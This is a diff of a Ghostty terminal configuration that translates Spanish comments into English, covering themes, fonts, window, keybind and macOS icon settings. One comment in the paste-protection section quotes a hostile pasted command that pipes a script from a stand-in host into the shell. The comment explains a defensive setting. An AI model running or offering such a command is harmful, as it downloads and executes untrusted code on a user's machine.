@@ -1,180 +1,180 @@
 # ═══════════════════════════════════════════════════════════════
 #  Ghostty — Claude Code edition
-#  Tema activo: ver línea `theme =` abajo (custom de ghostty/themes/,
-#  familia del "tema del stack"). Tipografía: PlemolJP Console NF.
+#  Active theme: see the `theme =` line below (a custom from ghostty/themes/,
+#  the "stack theme" family). Typeface: PlemolJP Console NF.
 #
-#  NOTA: Ghostty NO permite comentarios inline en la misma línea
-#  que un valor. Siempre van en una línea propia.
+#  NOTE: Ghostty does NOT allow inline comments on the same line
+#  as a value. They always go on their own line.
 # ═══════════════════════════════════════════════════════════════
 
-# ─── tema ─────────────────────────────────────────────────────
-# Acepta un custom de ghostty/themes/ (la familia del stack, abajo) o un
-# built-in de Ghostty (469 disponibles, lista con `ghostty +list-themes`
-# o preview en https://ghosttythemes.com).
-# Warm picks built-in: Gruvbox Material Dark, Gruvbox Dark Hard, Everforest
+# ─── theme ────────────────────────────────────────────────────
+# Accepts a custom one from ghostty/themes/ (the stack family, below) or a
+# Ghostty built-in (469 available, list them with `ghostty +list-themes`
+# or preview at https://ghosttythemes.com).
+# Warm built-in picks: Gruvbox Material Dark, Gruvbox Dark Hard, Everforest
 # Dark Hard, Kanagawa Wave (dark) — Gruvbox Material Light, Rose Pine
 # Dawn, Catppuccin Latte, Kanagawa Lotus (light). Solarized pick:
-# Solarized Dark Patched (estilo craftzdog).
+# Solarized Dark Patched (craftzdog style).
 #
-# NOTA: este `theme =` es LA selección activa y la fuente de verdad. Como
-# el archivo está versionado, un `git pull` propaga el tema a las otras
-# máquinas. Para cambiar el look: editá esta línea (y las líneas equivalentes
-# de nvim y tmux — comparten id) y commiteá. No hay switcher ni puntero.
+# NOTE: this `theme =` is THE active selection and the source of truth. Since
+# the file is versioned, a `git pull` propagates the theme to the other
+# machines. To change the look: edit this line (and the equivalent lines
+# in nvim and tmux — they share the id) and commit. There's no switcher and no pointer.
 theme = solarized-osaka
 
-# Custom themes — viven en `ghostty/themes/` (symlinkeado a
-# <config-dir>/themes/ por install.sh). Familia canónica del stack (mismo
-# id en Ghostty/nvim/tmux; para voltear el look editás las 3 configs):
-#   · light-2026 — clon del theme "2026 Light" que Microsoft shippeó como
-#     nuevo default de VS Code (extensions/theme-defaults/themes/2026-light.json,
-#     refresh "Focus" de 2026). Blanco puro + acento azul #0069CC.
-#   · dark-2026 — companion oscuro de light-2026, clon de "Dark 2026"
-#     (extensions/theme-defaults/themes/2026-dark.json, default de VS Code
-#     desde 1.113). Casi-negro #121314 + acento teal-azul #3994BC.
-#   · carbon — minimal true-black (#000) + alto contraste, único acento
-#     Claude orange (#d97757).
-#   · solarized-osaka — deep-ocean estilo craftzdog (azul casi negro). En
-#     Ghostty es el theme `solarized-osaka`; la paleta sale del plugin nvim.
-#   · xcode-oled — syntax de Xcode "Default (Dark)" (hex reales del plist
-#     de Apple) sobre true black (#000). Pensado para OLED: píxeles del
-#     fondo apagados. Reemplazó a oled-neon (Dracula) en la familia.
-#   · anthropic-dark — dark Claude.ai (brown-black + Claude orange).
-#   · anthropic-warm — carbón cálido + paleta Claude (terracota, oliva,
-#     ámbar, naranja). Pensado para display-p3 + transparencia, sesiones
-#     largas sin fatiga.
-#   · prism-night — azul-noche profundo (#0a0e1a) con acentos del
-#     espectro (naranja → amarillo → verde → cyan → azul → violeta).
-#     Sampleado del wallpaper "prism" de macOS.
-#   · paper — light cream + tinta sepia.
-#   · solarized-light — Solarized Light canónico de Ethan Schoonover.
-# Override de canvas estilo craftzdog: su Ghostty usa el built-in
-# "Solarized Dark - Patched" pero pisa el fondo con #031219 (deep ocean
-# azul casi negro, un pelo más claro que el base04 #001419 del plugin).
-# Este override gana sobre el background del theme — es LO que se ve
-# detrás del blur. Comentalo para volver al bg literal del theme activo.
+# Custom themes — they live in `ghostty/themes/` (symlinked to
+# <config-dir>/themes/ by install.sh). Canonical family of the stack (same
+# id in Ghostty/nvim/tmux; to flip the look you edit the 3 configs):
+#   · light-2026 — clone of the "2026 Light" theme that Microsoft shipped as
+#     VS Code's new default (extensions/theme-defaults/themes/2026-light.json,
+#     the 2026 "Focus" refresh). Pure white + blue accent #0069CC.
+#   · dark-2026 — dark companion of light-2026, clone of "Dark 2026"
+#     (extensions/theme-defaults/themes/2026-dark.json, VS Code's default
+#     since 1.113). Near-black #121314 + teal-blue accent #3994BC.
+#   · carbon — minimal true-black (#000) + high contrast, a single
+#     Claude orange accent (#d97757).
+#   · solarized-osaka — deep-ocean craftzdog style (near-black blue). In
+#     Ghostty it's the `solarized-osaka` theme; the palette comes from the nvim plugin.
+#   · xcode-oled — Xcode "Default (Dark)" syntax (real hex from Apple's
+#     plist) over true black (#000). Made for OLED: the background's
+#     pixels are switched off. It replaced oled-neon (Dracula) in the family.
+#   · anthropic-dark — Claude.ai dark (brown-black + Claude orange).
+#   · anthropic-warm — warm charcoal + the Claude palette (terracotta, olive,
+#     amber, orange). Made for display-p3 + transparency, long sessions
+#     without fatigue.
+#   · prism-night — deep night blue (#0a0e1a) with spectrum accents
+#     (orange → yellow → green → cyan → blue → violet).
+#     Sampled from the macOS "prism" wallpaper.
+#   · paper — light cream + sepia ink.
+#   · solarized-light — Ethan Schoonover's canonical Solarized Light.
+# craftzdog-style canvas override: his Ghostty uses the built-in
+# "Solarized Dark - Patched" but overrides the background with #031219 (deep ocean,
+# near-black blue, a touch lighter than the plugin's base04 #001419).
+# This override wins over the theme's background — it's WHAT you see
+# behind the blur. Comment it out to go back to the active theme's literal bg.
 background = #031219
 
-# Display P3 wide-gamut — naranja y crema saturan más en pantallas
-# M-chip / Retina. Sin downside fuera de equipos no-P3.
+# Display P3 wide-gamut — orange and cream saturate more on
+# M-chip / Retina screens. No downside on non-P3 machines.
 window-colorspace = display-p3
 
-# Contraste mínimo automático. Tradeoff fino:
-#   1.1 = sin enforcement (default amable). Dim grays se evaporan
-#         en light themes, brand colors fieles.
-#   3.0 = WCAG AA large-text. Rescata los peores grays pero preserva
-#         brand colors como Claude orange (#d97757, ratio 3.28:1 sobre
-#         cream — pasa intacto). Sweet spot para light themes (light-2026,
+# Automatic minimum contrast. Fine tradeoff:
+#   1.1 = no enforcement (friendly default). Dim grays evaporate
+#         in light themes, brand colors stay faithful.
+#   3.0 = WCAG AA large-text. Rescues the worst grays but preserves
+#         brand colors like Claude orange (#d97757, ratio 3.28:1 over
+#         cream — passes untouched). Sweet spot for light themes (light-2026,
 #         paper, solarized-light).
-#   4.5 = WCAG AA body text. Rescata todo gray pero DISTORSIONA brand
-#         colors: Claude orange queda casi negro. No recomendado.
-# En 1.1 porque el tema activo (solarized-osaka) es dark con grays
-# muted intencionales (base01/base00 solarized) — fidelidad total al
-# theme. Si cambiás a un tema claro de la familia, subí a 3.0.
+#   4.5 = WCAG AA body text. Rescues every gray but DISTORTS brand
+#         colors: Claude orange ends up nearly black. Not recommended.
+# At 1.1 because the active theme (solarized-osaka) is dark with
+# intentionally muted grays (solarized base01/base00) — full fidelity to the
+# theme. If you switch to a light theme from the family, raise it to 3.0.
 minimum-contrast = 1.1
 
-# ─── tipografía ───────────────────────────────────────────────
-# PlemolJP Console NF — fuente bilingüe JP/EN del estilo craftzdog.
-# Base IBM Plex Mono + glyphs japoneses + Nerd Font integrado (íconos
-# de starship/devicons sin fallback). "Console" = ratio 5:6 (más compacto
-# que el ratio 1:2 de PlemolJP estándar), ideal para terminales densos.
+# ─── typography ───────────────────────────────────────────────
+# PlemolJP Console NF — bilingual JP/EN font, craftzdog style.
+# IBM Plex Mono base + Japanese glyphs + integrated Nerd Font (starship/devicons
+# icons with no fallback). "Console" = 5:6 ratio (more compact
+# than standard PlemolJP's 1:2 ratio), ideal for dense terminals.
 font-family             = PlemolJP Console NF
 font-size = 15
 
-# Ligaduras estándar — iA Writer no es texture-healing pero soporta
-# +liga para los operadores comunes (=>, !=, >=, etc.).
+# Standard ligatures — iA Writer isn't texture-healing but it supports
+# +liga for the common operators (=>, !=, >=, etc.).
 font-feature = +liga
 
 font-thicken = true
 
-# Interlineado compacto — un toque sobre el default para que las
-# tildes/descenders no se peguen, sin desperdiciar verticales.
-# Subir a 10-15% si querés más aire, bajar a 0% para nativo de Iosevka.
+# Compact line spacing — a touch over the default so that
+# accents/descenders don't stick together, without wasting verticals.
+# Raise to 10-15% if you want more air, drop to 0% for Iosevka's native.
 adjust-cell-height = 3%
 
-# ─── ventana ──────────────────────────────────────────────────
-# tabs integradas en el titlebar (estilo Chrome/Arc): libera ~1
-# línea vertical de terminal y queda más limpio que tener tab bar
-# y titlebar separadas. El color hereda del background del theme.
-# Alternativas: transparent (titlebar funde con fondo, tab bar
-# aparte) · native (look macOS estándar) · hidden (sin titlebar).
+# ─── window ───────────────────────────────────────────────────
+# tabs integrated into the titlebar (Chrome/Arc style): frees up ~1
+# vertical line of terminal and looks cleaner than having a separate tab bar
+# and titlebar. The color is inherited from the theme's background.
+# Alternatives: transparent (titlebar blends with the background, separate
+# tab bar) · native (standard macOS look) · hidden (no titlebar).
 macos-titlebar-style = tabs
 
-# Look "glass" de craftzdog: mismos valores que su dotfiles-public
-# (background-opacity 0.9 + blur radius 20) — el wallpaper se ve
-# desenfocado detrás del deep ocean. Para volver al modo sólido
-# (fondo 100% legible): opacity 1.0 + blur 0.
+# craftzdog's "glass" look: the same values as his dotfiles-public
+# (background-opacity 0.9 + blur radius 20) — the wallpaper shows up
+# blurred behind the deep ocean. To go back to solid mode
+# (100% readable background): opacity 1.0 + blur 0.
 background-opacity = 0.9
 background-blur = 20
 
-# respira lateralmente — padding generoso para que el output denso
-# de Claude Code (tool calls, diffs, árboles) no se sienta apretado.
+# breathe sideways — generous padding so that Claude Code's dense
+# output (tool calls, diffs, trees) doesn't feel cramped.
 window-padding-x = 22
 window-padding-y = 18
 
-# centra contenido al hacer reflow
+# centers content on reflow
 window-padding-balance = true
 
-# extend = el padding hereda el color de la celda adyacente al borde
-# (se ve más cohesivo al seleccionar texto cerca del margen).
+# extend = the padding inherits the color of the cell adjacent to the border
+# (it looks more cohesive when selecting text near the margin).
 window-padding-color = extend
 
-# restaura sesión al reabrir Ghostty
+# restores the session when reopening Ghostty
 window-save-state = always
 
 # ─── cursor ───────────────────────────────────────────────────
-# Block — look "terminal classic" con carácter. El color sale del
-# theme activo (cursor-color + cursor-text). Otras opciones: bar,
+# Block — "classic terminal" look with character. The color comes from the
+# active theme (cursor-color + cursor-text). Other options: bar,
 # block_hollow, underline.
 cursor-style = block
 
-# sin parpadeo — cursor fijo, más sobrio y menos distractor. El
-# bloque sólido naranja ya es suficientemente visible sin animar.
+# no blinking — a steady cursor, more sober and less distracting. The
+# solid orange block is already visible enough without animating.
 cursor-style-blink = false
 
-# ─── selección y copiado ──────────────────────────────────────
-# seleccionar ya copia (workflow rápido)
+# ─── selection and copying ────────────────────────────────────
+# selecting already copies (fast workflow)
 copy-on-select = clipboard
 
-# Trim de espacios/newlines al final al copiar — evita el clásico
-# "pegué un comando y se ejecutó solo porque había \n al final".
+# Trims trailing spaces/newlines when copying — avoids the classic
+# "I pasted a command and it ran by itself because there was a \n at the end".
 clipboard-trim-trailing-spaces = true
 
-# Paste protection — Ghostty te muestra confirm dialog si el texto
-# pegado contiene newlines o caracteres de control sospechosos
-# (typical attack: copiar "ls" de una web que en realidad es
-# "ls; curl evil.sh | sh\n"). Cost: un click extra ocasional.
+# Paste protection — Ghostty shows you a confirm dialog if the pasted
+# text contains newlines or suspicious control characters
+# (typical attack: copying "ls" from a website that's actually
+# "ls; curl evil.sh | sh\n"). Cost: an occasional extra click.
 clipboard-paste-protection = true
 
 # ─── scrollback ───────────────────────────────────────────────
-# buffer grande para releer outputs largos
+# big buffer to re-read long outputs
 scrollback-limit = 100000
 
-# ─── notificaciones ───────────────────────────────────────────
-# Silenciar campanas — en SDD las interrupciones rompen el flow.
-# bell-features controla todos los modos de la campana.
+# ─── notifications ────────────────────────────────────────────
+# Silence the bells — in SDD, interruptions break the flow.
+# bell-features controls every mode of the bell.
 bell-features = no-system,no-audio,no-attention,no-title,no-border
 
 # ─── mouse ────────────────────────────────────────────────────
 mouse-hide-while-typing = true
 
-# ─── quick terminal (drop-down estilo Quake) ──────────────────
-# ⌥` te abre un terminal flotante encima de cualquier app para
-# checar algo sin perder el contexto de tu ventana principal.
-# Se cierra con la misma combinación pero el proceso sigue vivo
-# en background — ideal para tener tmux sessions persistentes
-# (claude, lazygit, REPLs) que reabrís al instante.
+# ─── quick terminal (Quake-style drop-down) ───────────────────
+# ⌥` opens a floating terminal on top of any app so you can
+# check something without losing your main window's context.
+# It closes with the same combo but the process stays alive
+# in the background — ideal for keeping persistent tmux sessions
+# (claude, lazygit, REPLs) that you reopen instantly.
 quick-terminal-position = top
-# 100% = ocupa toda la pantalla (full-screen popup). Si en algún
-# momento querés volver al modo "drop-down chico" estilo Quake,
-# poné 40% o 50%.
+# 100% = takes up the whole screen (full-screen popup). If at some
+# point you want to go back to the small Quake-style "drop-down" mode,
+# set 40% or 50%.
 quick-terminal-size = 100%
 quick-terminal-animation-duration = 0.15
 keybind = global:alt+grave_accent=toggle_quick_terminal
 
 # ─── splits ───────────────────────────────────────────────────
-# ⌘D abre split derecho y ⌘⇧D abre split abajo (defaults de Ghostty).
-# Navegación vim-style entre splits — clave cuando tienes
-# [spec | implementación | tests] lado a lado.
+# ⌘D opens a split on the right and ⌘⇧D a split below (Ghostty defaults).
+# vim-style navigation between splits — key when you have
+# [spec | implementation | tests] side by side.
 keybind = cmd+alt+h=goto_split:left
 keybind = cmd+alt+j=goto_split:bottom
 keybind = cmd+alt+k=goto_split:top
@@ -182,82 +182,82 @@ keybind = cmd+alt+l=goto_split:right
 keybind = cmd+shift+enter=toggle_split_zoom
 keybind = cmd+alt+equal=equalize_splits
 
-# Reset font-size — útil al hacer demos o screen-share de specs
+# Reset font-size — useful when doing demos or screen-sharing specs
 keybind = cmd+zero=reset_font_size
 
-# Shift+Enter = newline en Claude Code (en vez de submit). Ghostty
-# por default sigue modifyOtherKeys y manda `\x1b[27;2;13~`, que
-# Claude Code no interpreta como newline. Mandar `\n` directo sí
-# funciona — TUIs estilo nvim/lazygit no ven Shift+Enter sin esto
-# pero tampoco lo necesitan. Workaround documentado en ghostty
-# discussion #7780 y claude-code issue #5757.
+# Shift+Enter = newline in Claude Code (instead of submit). Ghostty
+# by default follows modifyOtherKeys and sends `\x1b[27;2;13~`, which
+# Claude Code doesn't interpret as a newline. Sending `\n` directly does
+# work — TUIs like nvim/lazygit don't see Shift+Enter without this
+# but they don't need it either. Workaround documented in ghostty
+# discussion #7780 and claude-code issue #5757.
 keybind = shift+enter=text:\n
 
 # ═══════════════════════════════════════════════════════════════
-#  PAQUETE 1 — macOS essentials
+#  PACKAGE 1 — macOS essentials
 # ═══════════════════════════════════════════════════════════════
 
-# Option (⌥) funciona como Alt → keybinds de vim/zsh/emacs funcionan.
-# `left`: solo el Option IZQUIERDO se mapea como Alt. El Option DERECHO
-# queda libre para caracteres especiales con teclado ES (⌥+ñ, ⌥+5 = €,
-# ⌥+8 = •, ⌥+e = ´, etc.). Mejor que `true` (ambos) si tipeás especiales.
+# Option (⌥) works as Alt → vim/zsh/emacs keybinds work.
+# `left`: only the LEFT Option maps as Alt. The RIGHT Option
+# stays free for special characters with an ES keyboard (⌥+ñ, ⌥+5 = €,
+# ⌥+8 = •, ⌥+e = ´, etc.). Better than `true` (both) if you type specials.
 macos-option-as-alt = left
 
-# Shell integration: activa cursor de stand-by con sudo,
-# inyecta path para apertura de archivos por click, etc.
+# Shell integration: enables the stand-by cursor with sudo,
+# injects the path for opening files by click, etc.
 shell-integration-features = cursor,sudo,title,no-ssh-env,no-ssh-terminfo,path
 
 # ═══════════════════════════════════════════════════════════════
-#  PAQUETE 2 — Notificaciones de comandos largos
+#  PACKAGE 2 — Long-command notifications
 # ═══════════════════════════════════════════════════════════════
 
-# Notifica vía macOS cuando un comando termina Y la ventana
-# está en otra app (no te molesta si ya estás viendo el terminal).
+# Notifies via macOS when a command finishes AND the window
+# is in another app (it doesn't bug you if you're already looking at the terminal).
 notify-on-command-finish = unfocused
 
-# Solo notifica si tardó más de 10 segundos.
+# Only notifies if it took more than 10 seconds.
 notify-on-command-finish-after = 10s
 
-# Notificación nativa de macOS, sin sonido de bell.
+# Native macOS notification, without the bell sound.
 notify-on-command-finish-action = no-bell,notify
 
 # ═══════════════════════════════════════════════════════════════
-#  PAQUETE 3 — Polish visual
+#  PACKAGE 3 — Visual polish
 # ═══════════════════════════════════════════════════════════════
 
-# Splits sin foco se atenúan al 85% — ves al instante dónde tecleas.
+# Unfocused splits dim to 85% — you see instantly where you're typing.
 unfocused-split-opacity = 0.85
 
-# Muestra dimensiones (cols×rows) al redimensionar la ventana.
+# Shows the dimensions (cols×rows) when resizing the window.
 resize-overlay = always
 resize-overlay-position = center
 
 # ═══════════════════════════════════════════════════════════════
-#  PAQUETE 4 — Keybinds productivos
+#  PACKAGE 4 — Productive keybinds
 # ═══════════════════════════════════════════════════════════════
 
-# Limpia la pantalla (preserva scrollback).
+# Clears the screen (preserves the scrollback).
 keybind = cmd+k=clear_screen
 
-# Abre el archivo de config con tu editor por default.
+# Opens the config file with your default editor.
 keybind = cmd+comma=open_config
 
-# Recarga config sin reiniciar Ghostty.
+# Reloads the config without restarting Ghostty.
 keybind = cmd+shift+r=reload_config
 
-# Copia la URL seleccionada en el buffer al clipboard.
+# Copies the URL selected in the buffer to the clipboard.
 keybind = cmd+shift+u=copy_url_to_clipboard
 
-# Cambia el título de la pestaña actual (útil para organizar SDD).
+# Changes the current tab's title (useful for organizing SDD).
 keybind = cmd+shift+i=prompt_surface_title
 
-# Jump-to-prompt (requiere shell-integration, ya activo arriba).
-# Salta al prompt anterior/siguiente en el scrollback — clave para
-# releer outputs largos de Claude Code sin scrollear a mano.
+# Jump-to-prompt (requires shell-integration, already active above).
+# Jumps to the previous/next prompt in the scrollback — key to
+# re-read long Claude Code outputs without scrolling by hand.
 keybind = cmd+up=jump_to_prompt:-1
 keybind = cmd+down=jump_to_prompt:1
 
-# Tabs por número: ⌘1..⌘9 salta directo a esa tab.
+# Tabs by number: ⌘1..⌘9 jumps straight to that tab.
 keybind = cmd+one=goto_tab:1
 keybind = cmd+two=goto_tab:2
 keybind = cmd+three=goto_tab:3
@@ -269,48 +269,48 @@ keybind = cmd+eight=goto_tab:8
 keybind = cmd+nine=goto_tab:9
 
 # ═══════════════════════════════════════════════════════════════
-#  PAQUETE 5 — Dock icon estilo light-2026 (horneado, no sigue al tema)
+#  PACKAGE 5 — light-2026-style dock icon (baked in, doesn't follow the theme)
 # ═══════════════════════════════════════════════════════════════
 
-# custom-style: frame aluminum (mac-nativo) + pantalla blanca light-2026
-# (#ffffff, el mismo bg del theme) + fantasma azul de acento.
-# Variantes built-in (mutuamente excluyentes con custom-style — NO
-# aceptan overrides de color): official, blueprint, chalkboard,
+# custom-style: aluminum frame (mac-native) + light-2026 white screen
+# (#ffffff, the theme's own bg) + blue accent ghost.
+# Built-in variants (mutually exclusive with custom-style — they do NOT
+# accept color overrides): official, blueprint, chalkboard,
 # microchip, glass, holographic, paper, retro, xray.
 macos-icon = custom-style
 
-# Frame: aluminum (gris hardware mac). Alternativas:
-# beige (paper-ish cálido), plastic (off-white), chrome (sleek).
+# Frame: aluminum (mac hardware gray). Alternatives:
+# beige (warm paper-ish), plastic (off-white), chrome (sleek).
 macos-icon-frame = aluminum
 
-# Fantasma azul de acento (#0069cc) — EL acento de light-2026 (button.background
-# / focusBorder en el JSON fuente de VS Code), el mismo del cursor en
-# Ghostty/nvim/tmux. Ata el icono a la identidad del theme. Variantes:
-# #ffffff blanco neutral (máx contraste, brand-agnostic) · #d97757 Claude orange.
+# Blue accent ghost (#0069cc) — THE light-2026 accent (button.background
+# / focusBorder in VS Code's source JSON), the same one as the cursor in
+# Ghostty/nvim/tmux. It ties the icon to the theme's identity. Variants:
+# #ffffff neutral white (max contrast, brand-agnostic) · #d97757 Claude orange.
 macos-icon-ghost-color = #0069cc
 
-# Pantalla: blanco light-2026 liso, sin banda de acentos. Ghostty sólo
-# soporta gradientes LINEALES VERTICALES (primer color = abajo, último =
-# arriba); acá un degradé sutil del bg del theme (#ffffff) a su superficie
-# elevada (#fafafd — sideBar/activityBar bg en el JSON fuente), apenas un
-# lift hacia arriba para dar profundidad sin ruido.
+# Screen: flat light-2026 white, no accent band. Ghostty only
+# supports LINEAR VERTICAL gradients (first color = bottom, last =
+# top); here it's a subtle gradient from the theme's bg (#ffffff) to its elevated
+# surface (#fafafd — sideBar/activityBar bg in the source JSON), just a
+# lift upwards to give depth without noise.
 #
-# Horneado a light-2026 a propósito (NO sigue al `theme =` de arriba): si
-# cambiás el tema, el icono se queda light-2026. Para re-sincronizarlo con
-# otro theme, usá su `background` + un lift hacia su superficie elevada.
+# Baked to light-2026 on purpose (it does NOT follow the `theme =` above): if
+# you change the theme, the icon stays light-2026. To re-sync it with
+# another theme, use its `background` + a lift towards its elevated surface.
 macos-icon-screen-color = #ffffff,#fafafd
 
 # ═══════════════════════════════════════════════════════════════
-#  PAQUETE 6 — Fullscreen pro (macOS)
+#  PACKAGE 6 — Fullscreen pro (macOS)
 # ═══════════════════════════════════════════════════════════════
 
-# Fullscreen non-native: sin la transición animada de macOS
-# (no manda Ghostty a otro "space"), mantiene la menubar visible.
-# Mucho mejor para focus mode rápido con ⌘↩.
-# Otras opciones: false (native), true (non-native sin menubar).
+# Non-native fullscreen: without the macOS animated transition
+# (it doesn't send Ghostty to another "space"), keeps the menubar visible.
+# Much better for quick focus mode with ⌘↩.
+# Other options: false (native), true (non-native without menubar).
 macos-non-native-fullscreen = visible-menu
 
-# Si prefieres ocultar los semáforos (rojo/amarillo/verde) cuando
-# entres a fullscreen para una vista más limpia, descomenta:
+# If you prefer to hide the traffic lights (red/yellow/green) when
+# you enter fullscreen for a cleaner view, uncomment:
 # macos-window-buttons = hidden
 
